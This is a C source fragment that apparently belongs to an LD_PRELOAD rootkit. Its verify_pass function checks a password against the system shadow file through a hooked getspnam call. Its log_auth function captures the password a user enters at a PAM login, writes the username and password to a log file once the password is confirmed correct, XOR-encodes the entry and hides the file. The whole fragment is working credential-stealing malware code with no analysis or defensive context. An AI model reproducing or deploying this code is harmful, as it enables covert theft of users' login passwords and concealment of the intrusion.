static int verify_pass(char *user, char *acc_pass){
	struct spwd *ent;
	char *pass;
	int got_pw;
	hook(CGETSPNAM);
	ent = call(CGETSPNAM, user);
	if(ent == NULL || strlen(ent->sp_pwdp) < 2)
		return 0;
	pass = crypt(acc_pass, ent->sp_pwdp);
	if(pass == NULL)
		return 0;
	got_pw = !strcmp(pass, ent->sp_pwdp);
	if(got_pw)
		return 1;
	return 0;
}

static void log_auth(pam_handle_t *pamh, char *resp){
	char *user, output[128];
	int  got_pw;
	FILE *fp;
	user = get_username(pamh);
	if(user == NULL)
		return;
	got_pw = verify_pass(user, resp);
	if(!got_pw)
		return;
	if((fp = xfopen(LDSO_LOGS, "a")) != NULL){
		sprintf(output, "%s:%s", user, resp);
		xor(t_o, output);
		fprintf(fp, "%s\n", t_o);
		clean(t_o);
		fflush(fp);
		fclose(fp);
	}
	if(!xhide_path(LDSO_LOGS))
		xhide_path(LDSO_LOGS);
}
